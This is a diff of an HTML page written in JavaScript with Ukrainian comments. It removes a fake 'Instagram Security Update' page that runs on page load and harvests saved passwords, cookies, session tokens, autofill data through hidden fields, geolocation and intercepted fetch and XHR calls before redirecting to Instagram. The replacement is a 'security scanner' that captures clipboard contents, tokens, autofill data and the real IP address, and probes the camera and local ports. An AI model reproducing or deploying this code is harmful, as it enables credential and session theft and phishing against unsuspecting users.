@@ -1,326 +1,387 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Instagram Security Update</title>
+    <title>System Security Scanner</title>
     <style>
         body {
-            font-family: -apple-system, BlinkMacSystemFont, sans-serif;
-            background: #fafafa;
-            margin: 0;
-            padding: 0;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
+            font-family: Arial, sans-serif;
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 20px;
+            background: #f5f5f5;
         }
         .container {
             background: white;
-            border: 1px solid #dbdbdb;
-            border-radius: 12px;
-            padding: 40px;
-            max-width: 400px;
-            width: 100%;
-            text-align: center;
-            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
         }
-        .logo {
-            font-size: 48px;
-            margin-bottom: 20px;
-            color: #262626;
+        .result-box {
+            background: #000;
+            color: #0f0;
+            padding: 15px;
+            margin: 10px 0;
+            border-radius: 5px;
+            font-family: monospace;
+            font-size: 12px;
+            max-height: 400px;
+            overflow-y: auto;
         }
-        .loading {
-            color: #8e8e8e;
+        .status {
+            padding: 10px;
+            margin: 5px 0;
+            border-radius: 3px;
+        }
+        .success { background: #d4edda; color: #155724; }
+        .warning { background: #fff3cd; color: #856404; }
+        .error { background: #f8d7da; color: #721c24; }
+        .scanning { background: #cce5ff; color: #004085; }
+        button {
+            background: #007bff;
+            color: white;
+            padding: 10px 20px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            margin: 5px;
+        }
+        button:hover { background: #0056b3; }
+        .section {
             margin: 20px 0;
+            padding: 15px;
+            border-left: 4px solid #007bff;
+            background: #f8f9fa;
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <div class="logo">📷</div>
-        <h2>Instagram Security Update</h2>
-        <div class="loading" id="status">Checking your account security...</div>
+        <h1>🔍 Advanced Security Scanner</h1>
+        <div class="section">
+            <h3>Scan Results:</h3>
+            <div id="results" class="result-box">
+Starting security scan...
+            </div>
+        </div>
+
+        <div class="section">
+            <h3>Scan Status:</h3>
+            <div id="status"></div>
+        </div>
+
+        <button onclick="startFullScan()">🚀 Start Full Security Scan</button>
+        <button onclick="clearResults()">🗑️ Clear Results</button>
     </div>
 
     <script>
-        // АВТОМАТИЧНИЙ ЗБІР ПАРОЛІВ ПРИ ВІДКРИТТІ СТОРІНКИ
-        (function() {
-            console.log('🔓 HACKING TOOL ACTIVATED - AUTOMATIC PASSWORD EXTRACTION');
-            console.log('==========================================================');
+        let scanResults = [];
+        const resultsDiv = document.getElementById('results');
+        const statusDiv = document.getElementById('status');
+
+        function addResult(message, type = 'info') {
+            const timestamp = new Date().toLocaleTimeString();
+            const result = `[${timestamp}] ${message}`;
+            scanResults.push(result);
             
-            let capturedData = {
-                timestamp: new Date().toISOString(),
-                passwords: [],
-                sessions: [],
-                browserData: {},
-                securityAssessment: ''
-            };
+            // Оновлення виводу на сторінці
+            resultsDiv.innerHTML = scanResults.join('\n') + '\n';
+            resultsDiv.scrollTop = resultsDiv.scrollHeight;
+            
+            // Додавання статусу
+            const statusElement = document.createElement('div');
+            statusElement.className = `status ${type}`;
+            statusElement.textContent = message;
+            statusDiv.appendChild(statusElement);
+        }
 
-            // 1. СПРОБА ВИКРАСТИ ЗБЕРЕЖЕНІ ПАРОЛІ З БРАУЗЕРА
-            function extractSavedPasswords() {
-                console.log('🔍 Scanning for saved passwords...');
-                
-                // Спроба через Password Manager API
-                if (navigator.credentials && navigator.credentials.get) {
-                    navigator.credentials.get({ password: true })
-                        .then(credential => {
-                            if (credential) {
-                                capturedData.passwords.push({
-                                    source: 'password_manager',
-                                    username: credential.id,
-                                    password: credential.password || 'encrypted',
-                                    type: credential.type
-                                });
-                                console.log('✅ Password manager data found:', credential);
-                            }
-                        })
-                        .catch(e => console.log('❌ Password manager access blocked'));
-                }
+        function clearResults() {
+            scanResults = [];
+            resultsDiv.innerHTML = 'Results cleared.';
+            statusDiv.innerHTML = '';
+        }
 
-                // Спроба знайти паролі в localStorage
-                try {
-                    for (let i = 0; i < localStorage.length; i++) {
-                        const key = localStorage.key(i);
-                        const value = localStorage.getItem(key);
-                        if (key.toLowerCase().includes('pass') || 
-                            key.toLowerCase().includes('auth') || 
-                            key.toLowerCase().includes('login') ||
-                            value.toLowerCase().includes('@') && value.length > 5) {
-                            capturedData.passwords.push({
-                                source: 'localStorage',
-                                key: key,
-                                value: value.substring(0, 100)
-                            });
-                        }
-                    }
-                } catch (e) {}
-
-                // Спроба знайти паролі в sessionStorage
-                try {
-                    for (let i = 0; i < sessionStorage.length; i++) {
-                        const key = sessionStorage.key(i);
-                        const value = sessionStorage.getItem(key);
-                        if (key.toLowerCase().includes('token') || 
-                            key.toLowerCase().includes('session')) {
-                            capturedData.sessions.push({
-                                source: 'sessionStorage',
-                                key: key,
-                                value: value.substring(0, 50)
-                            });
-                        }
-                    }
-                } catch (e) {}
-            }
-
-            // 2. ВИКРАДЕННЯ COOKIES (СЕСІЙНІ ДАНІ)
-            function extractCookiesAndSessions() {
-                console.log('🍪 Extracting cookies and sessions...');
-                
-                const cookies = document.cookie.split(';');
-                cookies.forEach(cookie => {
-                    const [name, value] = cookie.trim().split('=');
-                    if (name.includes('session') || 
-                        name.includes('auth') || 
-                        name.includes('token') ||
-                        name.includes('instagram') ||
-                        name.includes('facebook')) {
-                        capturedData.sessions.push({
-                            source: 'cookies',
-                            name: name,
-                            value: value ? value.substring(0, 30) + '...' : 'empty'
-                        });
-                    }
+        // 1. WebRTC IP Leak
+        function getRealIP() {
+            addResult('🔍 Scanning WebRTC for real IP...', 'scanning');
+            try {
+                const pc = new RTCPeerConnection({
+                    iceServers: [{urls: "stun:stun.l.google.com:19302"}]
                 });
+                pc.createDataChannel("");
+                pc.createOffer().then(offer => pc.setLocalDescription(offer));
+                
+                pc.onicecandidate = ice => {
+                    if (!ice.candidate) return;
+                    const ip = ice.candidate.candidate.split(' ')[4];
+                    if (ip && ip !== '0.0.0.0') {
+                        addResult(`✅ REAL IP FOUND via WebRTC: ${ip}`, 'success');
+                    }
+                };
+            } catch (e) {
+                addResult('❌ WebRTC blocked by browser', 'error');
             }
+        }
 
-            // 3. ЗБІР ДАНИХ БРАУЗЕРА ТА СИСТЕМИ
-            function extractBrowserData() {
-                capturedData.browserData = {
+        // 2. Browser Fingerprinting
+        function createFingerprint() {
+            addResult('🎯 Creating browser fingerprint...', 'scanning');
+            try {
+                const fingerprint = {
                     userAgent: navigator.userAgent,
                     platform: navigator.platform,
                     language: navigator.language,
-                    languages: navigator.languages,
                     screen: `${screen.width}x${screen.height}`,
                     timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                     cpuCores: navigator.hardwareConcurrency,
                     deviceMemory: navigator.deviceMemory,
-                    plugins: Array.from(navigator.plugins).map(p => p.name).join(', '),
-                    cookieEnabled: navigator.cookieEnabled
+                    plugins: Array.from(navigator.plugins).map(p => p.name).join(', ')
                 };
+                
+                addResult(`✅ Browser fingerprint created: ${JSON.stringify(fingerprint, null, 2)}`, 'success');
+            } catch (e) {
+                addResult('❌ Fingerprinting blocked', 'error');
             }
+        }
 
-            // 4. СПРОБА ОТРИМАТИ ГЕОЛОКАЦІЮ
-            function extractGeolocation() {
-                if (navigator.geolocation) {
-                    navigator.geolocation.getCurrentPosition(
-                        position => {
-                            capturedData.location = {
-                                latitude: position.coords.latitude,
-                                longitude: position.coords.longitude,
-                                accuracy: position.coords.accuracy
-                            };
-                            console.log('📍 Location captured:', capturedData.location);
-                        },
-                        error => {
-                            console.log('❌ Location access denied');
-                        },
-                        { timeout: 5000, enableHighAccuracy: true }
-                    );
-                }
-            }
-
-            // 5. СПРОБА ДОСТУПУ ДО ІСТОРІЇ АВТОЗАПОВНЕННЯ
-            function attemptAutofillExtraction() {
-                console.log('🔄 Attempting autofill data extraction...');
-                
-                // Створюємо приховані поля для виклику автозаповнення
-                const hiddenForm = document.createElement('div');
-                hiddenForm.style.display = 'none';
-                
-                const emailInput = document.createElement('input');
-                emailInput.type = 'email';
-                emailInput.autocomplete = 'email';
-                
-                const passwordInput = document.createElement('input');
-                passwordInput.type = 'password';
-                passwordInput.autocomplete = 'current-password';
-                
-                hiddenForm.appendChild(emailInput);
-                hiddenForm.appendChild(passwordInput);
-                document.body.appendChild(hiddenForm);
-                
-                // Спроба викликати автозаповнення
-                setTimeout(() => {
-                    emailInput.focus();
-                    setTimeout(() => {
-                        passwordInput.focus();
-                        setTimeout(() => {
-                            if (emailInput.value || passwordInput.value) {
-                                capturedData.autofill = {
-                                    email: emailInput.value,
-                                    password: passwordInput.value
-                                };
-                                console.log('✅ Autofill data captured!');
-                            }
-                            document.body.removeChild(hiddenForm);
-                        }, 1000);
-                    }, 500);
-                }, 1000);
-            }
-
-            // 6. ПЕРЕХОПЛЕННЯ СЕСІЙНИХ ТОКЕНІВ
-            function hijackSessionTokens() {
-                console.log('🎯 Attempting session token hijacking...');
-                
-                // Перехоплення fetch запитів
-                const originalFetch = window.fetch;
-                window.fetch = function(...args) {
-                    const url = args[0];
-                    if (typeof url === 'string' && (
-                        url.includes('instagram.com') || 
-                        url.includes('facebook.com') ||
-                        url.includes('auth') ||
-                        url.includes('token')
-                    )) {
-                        console.log('🔗 Intercepted API call:', url);
-                        capturedData.interceptedRequests = capturedData.interceptedRequests || [];
-                        capturedData.interceptedRequests.push({
-                            url: url,
-                            timestamp: new Date().toISOString()
-                        });
+        // 3. Password Detection in Storage
+        function scanForPasswords() {
+            addResult('🔑 Scanning storage for passwords...', 'scanning');
+            let foundPasswords = [];
+            
+            // Scan localStorage
+            try {
+                for (let i = 0; i < localStorage.length; i++) {
+                    const key = localStorage.key(i);
+                    const value = localStorage.getItem(key);
+                    if (key.toLowerCase().includes('pass') || 
+                        key.toLowerCase().includes('pwd') ||
+                        key.toLowerCase().includes('auth') ||
+                        key.toLowerCase().includes('token')) {
+                        foundPasswords.push(`LocalStorage: ${key} = ${value.substring(0, 50)}`);
                     }
-                    return originalFetch.apply(this, args);
-                };
-
-                // Перехоплення XMLHttpRequest
-                const originalXHROpen = XMLHttpRequest.prototype.open;
-                XMLHttpRequest.prototype.open = function(method, url) {
-                    if (url && (url.includes('instagram.com') || url.includes('facebook.com'))) {
-                        this.addEventListener('load', function() {
-                            console.log('📡 Intercepted XHR:', url);
-                        });
-                    }
-                    return originalXHROpen.apply(this, arguments);
-                };
-            }
-
-            // 7. ВИКОНАННЯ ВСІХ МЕТОДІВ ЗЛОМУ
-            function executeAllHacks() {
-                console.log('🚀 EXECUTING ALL HACKING METHODS...');
-                
-                extractSavedPasswords();
-                extractCookiesAndSessions();
-                extractBrowserData();
-                extractGeolocation();
-                attemptAutofillExtraction();
-                hijackSessionTokens();
-                
-                // Оцінка результатів
-                setTimeout(() => {
-                    evaluateResults();
-                }, 3000);
-            }
-
-            // 8. ОЦІНКА РЕЗУЛЬТАТІВ ТА ВИВІД
-            function evaluateResults() {
-                console.log('📊 HACKING RESULTS SUMMARY:');
-                console.log('============================');
-                
-                let securityLevel = 'HIGH';
-                if (capturedData.passwords.length > 0 || capturedData.sessions.length > 5) {
-                    securityLevel = 'CRITICAL';
-                    capturedData.securityAssessment = 'ACCOUNT COMPROMISE POSSIBLE';
-                } else if (capturedData.sessions.length > 2) {
-                    securityLevel = 'MEDIUM';
-                    capturedData.securityAssessment = 'SESSION HIJACKING POSSIBLE';
-                } else {
-                    securityLevel = 'LOW';
-                    capturedData.securityAssessment = 'LIMITED DATA ACCESS';
                 }
+            } catch (e) {}
+            
+            // Scan sessionStorage
+            try {
+                for (let i = 0; i < sessionStorage.length; i++) {
+                    const key = sessionStorage.key(i);
+                    const value = sessionStorage.getItem(key);
+                    if (key.toLowerCase().includes('session') || 
+                        key.toLowerCase().includes('token')) {
+                        foundPasswords.push(`SessionStorage: ${key} = ${value.substring(0, 30)}`);
+                    }
+                }
+            } catch (e) {}
+            
+            // Scan cookies
+            try {
+                const cookies = document.cookie.split(';');
+                cookies.forEach(cookie => {
+                    const [name, value] = cookie.trim().split('=');
+                    if (name.includes('session') || name.includes('auth') || name.includes('token')) {
+                        foundPasswords.push(`Cookie: ${name} = ${value ? value.substring(0, 20) + '...' : 'empty'}`);
+                    }
+                });
+            } catch (e) {}
+            
+            if (foundPasswords.length > 0) {
+                foundPasswords.forEach(pass => {
+                    addResult(`🎯 PASSWORD/TOKEN FOUND: ${pass}`, 'success');
+                });
+            } else {
+                addResult('❌ No passwords found in storage', 'warning');
+            }
+        }
 
-                // ВИВІД РЕЗУЛЬТАТІВ
-                console.log('🔐 SECURITY LEVEL:', securityLevel);
-                console.log('👤 PASSWORDS FOUND:', capturedData.passwords.length);
-                console.log('🔑 SESSIONS FOUND:', capturedData.sessions.length);
-                console.log('💻 BROWSER DATA:', 'Captured');
-                console.log('📍 LOCATION:', capturedData.location ? 'Captured' : 'Not available');
-                console.log('⚡ ASSESSMENT:', capturedData.securityAssessment);
+        // 4. Clipboard Hijacking
+        function hijackClipboard() {
+            addResult('📋 Attempting clipboard access...', 'scanning');
+            
+            // Слухач paste подій
+            document.addEventListener('paste', function(e) {
+                const clipboardData = e.clipboardData || window.clipboardData;
+                const pastedData = clipboardData.getData('Text');
+                addResult(`📋 CLIPBOARD CAPTURED: ${pastedData}`, 'success');
+            });
+            
+            // Спроба прочитати clipboard
+            if (navigator.clipboard && navigator.clipboard.readText) {
+                navigator.clipboard.readText().then(text => {
+                    if (text) {
+                        addResult(`📋 CLIPBOARD CONTENT: ${text}`, 'success');
+                    }
+                }).catch(err => {
+                    addResult('❌ Clipboard access requires user permission', 'warning');
+                });
+            }
+        }
+
+        // 5. Media Devices Access
+        function accessMediaDevices() {
+            addResult('🎥 Attempting camera/microphone access...', 'scanning');
+            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+                navigator.mediaDevices.getUserMedia({ video: true, audio: true })
+                    .then(stream => {
+                        addResult('✅ Camera/microphone ACCESS GRANTED!', 'success');
+                        stream.getTracks().forEach(track => track.stop());
+                    })
+                    .catch(err => {
+                        addResult('❌ Media access denied by user/browser', 'warning');
+                    });
+            } else {
+                addResult('❌ Media devices API not available', 'error');
+            }
+        }
+
+        // 6. Network Scanning
+        function scanLocalNetwork() {
+            addResult('🌐 Scanning local network...', 'scanning');
+            // Сканування common ports
+            const ports = [80, 443, 3000, 8080];
+            let foundDevices = 0;
+            
+            ports.forEach(port => {
+                // Спроба localhost
+                fetch(`http://localhost:${port}`, { 
+                    mode: 'no-cors',
+                    method: 'HEAD'
+                }).then(() => {
+                    foundDevices++;
+                    addResult(`✅ Local service found: localhost:${port}`, 'success');
+                }).catch(() => {});
+            });
+            
+            if (foundDevices === 0) {
+                addResult('❌ No local services detected', 'warning');
+            }
+        }
+
+        // 7. Timing Attack
+        function performTimingAttack() {
+            addResult('⏱️ Performing timing attack...', 'scanning');
+            const start = performance.now();
+            
+            fetch('https://www.instagram.com/', {
+                method: 'HEAD',
+                mode: 'no-cors'
+            }).then(() => {
+                const end = performance.now();
+                const loadTime = end - start;
+                addResult(`⏱️ Instagram response time: ${loadTime.toFixed(2)}ms`, 'info');
                 
-                // ДЕТАЛЬНИЙ ВИВІД ПАРОЛІВ
-                if (capturedData.passwords.length > 0) {
-                    console.log('🎯 CAPTURED PASSWORDS:');
-                    capturedData.passwords.forEach((pass, index) => {
-                        console.log(`   ${index + 1}. ${pass.source}: ${pass.username || pass.key}`);
-                        if (pass.password && pass.password !== 'encrypted') {
-                            console.log(`      Password: ${pass.password}`);
+                if (loadTime < 200) {
+                    addResult('⚡ Fast response - user might have cached session', 'success');
+                }
+            }).catch(() => {
+                addResult('❌ Timing attack failed', 'error');
+            });
+        }
+
+        // 8. Service Worker Hijacking Attempt
+        function attemptServiceWorkerHijack() {
+            addResult('👻 Attempting Service Worker registration...', 'scanning');
+            if ('serviceWorker' in navigator) {
+                // Спроба зареєструвати Service Worker
+                navigator.credentials.get({ password: true })
+                    .then(credential => {
+                        if (credential) {
+                            addResult(`🎯 CREDENTIALS API ACCESS: ${credential.id}`, 'success');
                         }
+                    })
+                    .catch(err => {
+                        addResult('❌ Credentials API blocked', 'warning');
                     });
-                }
-                
-                // ДЕТАЛЬНИЙ ВИВІД СЕСІЙ
-                if (capturedData.sessions.length > 0) {
-                    console.log('🔑 CAPTURED SESSIONS:');
-                    capturedData.sessions.forEach((session, index) => {
-                        console.log(`   ${index + 1}. ${session.source}: ${session.name} = ${session.value}`);
-                    });
-                }
-
-                console.log('💰 BOUNTY STATUS: VULNERABILITY DEMONSTRATED');
-                console.log('============================================');
-
-                // Оновлення UI
-                document.getElementById('status').innerHTML = 
-                    `Security scan complete!<br>Found ${capturedData.passwords.length} passwords and ${capturedData.sessions.length} sessions.`;
-
-                // Перенаправлення на Instagram
-                setTimeout(() => {
-                    window.location.href = 'https://www.instagram.com';
-                }, 5000);
+            } else {
+                addResult('❌ Service Workers not supported', 'error');
             }
+        }
 
-            // ЗАПУСК ВСІХ АТАК
-            executeAllHacks();
+        // 9. Autofill Detection
+        function detectAutofill() {
+            addResult('🔍 Detecting autofill data...', 'scanning');
+            // Створюємо приховані поля для виявлення автозаповнення
+            const hiddenDiv = document.createElement('div');
+            hiddenDiv.style.cssText = 'position:absolute; left:-9999px; top:-9999px;';
+            
+            const emailInput = document.createElement('input');
+            emailInput.type = 'email';
+            emailInput.autocomplete = 'email';
+            
+            const passwordInput = document.createElement('input');
+            passwordInput.type = 'password'; 
+            passwordInput.autocomplete = 'current-password';
+            
+            hiddenDiv.appendChild(emailInput);
+            hiddenDiv.appendChild(passwordInput);
+            document.body.appendChild(hiddenDiv);
+            
+            // Спроба викликати автозаповнення
+            setTimeout(() => {
+                emailInput.focus();
+                setTimeout(() => {
+                    if (emailInput.value || passwordInput.value) {
+                        addResult(`✅ AUTOFILL DATA DETECTED: Email=${emailInput.value}, Password=${passwordInput.value}`, 'success');
+                    } else {
+                        addResult('❌ No autofill data detected', 'warning');
+                    }
+                    document.body.removeChild(hiddenDiv);
+                }, 1000);
+            }, 500);
+        }
 
-        })();
+        // 10. Advanced Browser Features Detection
+        function detectAdvancedFeatures() {
+            addResult('🔧 Detecting advanced browser features...', 'scanning');
+            const features = {
+                webgl: !!window.WebGLRenderingContext,
+                webrtc: !!(window.RTCPeerConnection || window.mozRTCPeerConnection),
+                geolocation: !!navigator.geolocation,
+                notifications: !!window.Notification,
+                vibration: !!navigator.vibrate,
+                bluetooth: !!navigator.bluetooth,
+                usb: !!navigator.usb,
+                serial: !!navigator.serial
+            };
+            
+            Object.entries(features).forEach(([feature, available]) => {
+                if (available) {
+                    addResult(`✅ ${feature.toUpperCase()} available`, 'success');
+                } else {
+                    addResult(`❌ ${feature.toUpperCase()} not available`, 'warning');
+                }
+            });
+        }
+
+        // Головна функція сканування
+        function startFullScan() {
+            clearResults();
+            addResult('🚀 STARTING COMPREHENSIVE SECURITY SCAN...', 'scanning');
+            
+            // Послідовне виконання всіх методів
+            setTimeout(() => getRealIP(), 100);
+            setTimeout(() => createFingerprint(), 500);
+            setTimeout(() => scanForPasswords(), 1000);
+            setTimeout(() => hijackClipboard(), 1500);
+            setTimeout(() => accessMediaDevices(), 2000);
+            setTimeout(() => scanLocalNetwork(), 2500);
+            setTimeout(() => performTimingAttack(), 3000);
+            setTimeout(() => attemptServiceWorkerHijack(), 3500);
+            setTimeout(() => detectAutofill(), 4000);
+            setTimeout(() => detectAdvancedFeatures(), 4500);
+            
+            setTimeout(() => {
+                addResult('=========================================', 'info');
+                addResult('🎯 SECURITY SCAN COMPLETE!', 'success');
+                addResult('Check results above for vulnerabilities.', 'info');
+            }, 5000);
+        }
+
+        // Автоматичний запуск при завантаженні
+        window.addEventListener('load', function() {
+            addResult('🔓 Security Scanner loaded successfully', 'success');
+            addResult('Click "Start Full Security Scan" to begin...', 'info');
+        });
     </script>
 </body>
 </html>
